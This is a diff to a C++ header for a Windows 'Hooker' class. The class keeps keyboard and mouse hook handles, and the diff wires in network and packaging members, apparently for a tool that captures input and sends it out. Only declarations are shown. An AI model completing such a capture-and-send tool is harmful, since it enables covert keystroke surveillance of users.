@@ -1,15 +1,20 @@
 #ifndef HOOKER_HH_
 # define HOOKER_HH__
 
+# define WIN32_LEAN_AND_MEAN
+
 # include <Windows.h>
 # include <iostream>
+# include "reseau\Network.hh"
+# include "Packager.h"
 
 class Hooker {
 protected:
 	HHOOK _kHook;
 	HHOOK _mHook;
 	bool _connected;
-	//Network* _network;
+	Network* _network;
+	Packager _packager;
 
 public:
 	static Hooker& getInstance();
@@ -21,7 +26,7 @@ public:
 	bool connect();
 
 	bool& isConnected();
-	//Network& getNetwork();
+	Network& getNetwork();
 
 protected:
 	Hooker();
